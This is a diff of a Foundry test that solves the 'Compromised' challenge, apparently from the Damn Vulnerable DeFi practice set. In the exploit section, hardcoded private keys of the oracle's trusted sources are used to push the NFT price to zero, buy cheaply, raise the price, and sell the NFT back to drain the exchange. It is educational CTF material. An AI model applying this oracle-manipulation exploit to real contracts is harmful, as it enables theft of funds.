@@ -57,16 +57,10 @@ contract Compromised is Test {
         }
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        trustfulOracle = new TrustfulOracleInitializer(
-            sources,
-            symbols,
-            initialPrices
-        ).oracle();
+        trustfulOracle = new TrustfulOracleInitializer(sources, symbols, initialPrices).oracle();
 
         // Deploy the exchange and get the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
-            address(trustfulOracle)
-        );
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(trustfulOracle));
         damnValuableNFT = exchange.token();
 
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
@@ -76,7 +70,34 @@ contract Compromised is Test {
         /**
          * EXPLOIT START *
          */
+        address TRUSTED_SOURCE1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
+        address TRUSTED_SOURCE2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);
 
+        vm.prank(TRUSTED_SOURCE1);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(TRUSTED_SOURCE2);
+        trustfulOracle.postPrice("DVNFT", 0);
+
+        vm.prank(attacker);
+        address(exchange).call{value: 0.05 ether}(abi.encodeWithSignature("buyOne()"));
+
+        vm.prank(TRUSTED_SOURCE1);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.prank(TRUSTED_SOURCE2);
+        trustfulOracle.postPrice("DVNFT", 9990 ether);
+
+        vm.startPrank(attacker);
+        damnValuableNFT.approve(address(exchange), 0);
+        exchange.sellOne(0);
+        vm.stopPrank();
+
+        vm.prank(TRUSTED_SOURCE1);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
+
+        vm.prank(TRUSTED_SOURCE2);
+        trustfulOracle.postPrice("DVNFT", 999 ether);
         /**
          * EXPLOIT END *
          */
